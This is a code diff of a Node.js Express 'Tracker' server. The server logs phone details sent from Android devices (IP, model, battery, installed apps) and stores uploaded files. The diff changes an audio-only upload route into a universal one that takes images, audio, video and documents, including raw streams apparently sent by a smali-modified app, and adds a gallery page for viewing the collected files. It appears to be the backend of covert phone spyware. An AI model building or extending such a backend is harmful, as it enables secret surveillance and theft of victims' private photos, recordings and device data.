@@ -15,9 +15,11 @@ if (!fs.existsSync(UPLOAD_DIR)) {
   fs.mkdirSync(UPLOAD_DIR);
 }
 
+/* ================= STORAGE ================= */
+
 const upload = multer({
   dest: UPLOAD_DIR,
-  limits: { fileSize: 10 * 1024 * 1024 }
+  limits: { fileSize: 50 * 1024 * 1024 } // 50MB future safe
 });
 
 app.use('/uploads', express.static(UPLOAD_DIR));
@@ -67,31 +69,22 @@ app.get('/track', (req, res) => {
   };
 
   console.log("\n🔥 DEVICE =====================");
-  console.log("IP:", data.ip);
-  console.log("Model:", data.model);
-  console.log("Brand:", data.brand);
-  console.log("Android:", data.android);
-  console.log("Battery:", data.battery);
-
-  console.log("\n📦 Apps List:");
-  data.apps.forEach((app, i) => {
-    console.log(`${i + 1}. ${app}`);
-  });
+  console.log(data);
 
   saveLog(data);
 
   res.json({ status: "ok" });
 });
 
-/* ================= UPLOAD ================= */
+/* ================= UNIVERSAL UPLOAD ================= */
 
-app.post('/upload-audio', (req, res) => {
+app.post('/upload', (req, res) => {
 
   const contentType = req.headers['content-type'] || "";
 
-  // 🔴 MULTIPART
+  // 🔴 MULTIPART (audio/video/doc/image)
   if (contentType.includes("multipart")) {
-    return upload.single('audio')(req, res, () => {
+    return upload.single('file')(req, res, () => {
 
       if (!req.file) {
         return res.status(400).send("No file");
@@ -99,11 +92,14 @@ app.post('/upload-audio', (req, res) => {
 
       const url = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
 
-      console.log("\n📦 MULTIPART FILE:", req.file.filename);
+      console.log("\n📦 MULTIPART FILE =====================");
+      console.log("File:", req.file.filename);
+      console.log("Size:", req.file.size);
 
       saveLog({
         type: "multipart",
         file: req.file.filename,
+        original: req.file.originalname,
         size: req.file.size,
         url,
         time: new Date().toISOString()
@@ -113,29 +109,33 @@ app.post('/upload-audio', (req, res) => {
     });
   }
 
-  // 🔥 RAW (SMALI IMAGE)
-  let ext = ".jpg";
+  // 🔥 RAW UPLOAD (smali / direct stream)
+  let ext = ".bin";
 
+  if (contentType.includes("image")) ext = ".jpg";
   if (contentType.includes("png")) ext = ".png";
-  if (contentType.includes("jpeg")) ext = ".jpg";
+  if (contentType.includes("audio")) ext = ".mp3";
+  if (contentType.includes("video")) ext = ".mp4";
 
   const fileName = Date.now() + ext;
   const filePath = path.join(UPLOAD_DIR, fileName);
 
   const stream = fs.createWriteStream(filePath);
-
   req.pipe(stream);
 
   req.on('end', () => {
 
     const url = `${req.protocol}://${req.get('host')}/uploads/${fileName}`;
 
-    console.log("\n📸 RAW IMAGE:", fileName);
+    console.log("\n📥 RAW FILE =====================");
+    console.log("File:", fileName);
+    console.log("Type:", contentType);
     console.log("IP:", getIP(req));
 
     saveLog({
       type: "raw",
       file: fileName,
+      contentType,
       url,
       time: new Date().toISOString()
     });
@@ -149,16 +149,47 @@ app.post('/upload-audio', (req, res) => {
   });
 });
 
-/* ================= FILE VIEW ================= */
+/* ================= GALLERY ================= */
 
-app.get('/audio/:name', (req, res) => {
-  const filePath = path.join(UPLOAD_DIR, req.params.name);
+app.get('/gallery', (req, res) => {
 
-  if (!fs.existsSync(filePath)) {
-    return res.status(404).send("File not found");
-  }
+  const files = fs.readdirSync(UPLOAD_DIR);
 
-  res.sendFile(filePath);
+  let html = `
+  <html>
+  <head>
+    <title>Gallery</title>
+    <style>
+      body { background:#111; color:#fff; font-family:sans-serif; }
+      .grid { display:flex; flex-wrap:wrap; }
+      img, video { width:200px; margin:10px; border-radius:10px; }
+      a { color:#0af; display:block; margin:5px; }
+    </style>
+  </head>
+  <body>
+    <h2>Total Files: ${files.length}</h2>
+    <div class="grid">
+  `;
+
+  files.reverse().forEach(file => {
+
+    if (file.endsWith(".jpg") || file.endsWith(".png")) {
+      html += `<a href="/uploads/${file}" target="_blank">
+                <img src="/uploads/${file}" />
+              </a>`;
+    } else if (file.endsWith(".mp4")) {
+      html += `<video controls src="/uploads/${file}"></video>`;
+    } else if (file.endsWith(".mp3")) {
+      html += `<a href="/uploads/${file}" target="_blank">🎧 ${file}</a>`;
+    } else {
+      html += `<a href="/uploads/${file}" target="_blank">📄 ${file}</a>`;
+    }
+
+  });
+
+  html += `</div></body></html>`;
+
+  res.send(html);
 });
 
 /* ================= USERS ================= */
@@ -171,8 +202,7 @@ app.get('/users', (req, res) => {
       .split("\n")
       .filter(Boolean)
       .map(x => {
-        try { return JSON.parse(x); }
-        catch { return null; }
+        try { return JSON.parse(x); } catch { return null; }
       })
       .filter(Boolean);
 
@@ -199,7 +229,7 @@ app.get('/health', (req, res) => {
 /* ================= HOME ================= */
 
 app.get('/', (req, res) => {
-  res.send("Tracker running (stable + structured logs)");
+  res.send("Tracker running (images + audio + video + docs)");
 });
 
 /* ================= START ================= */
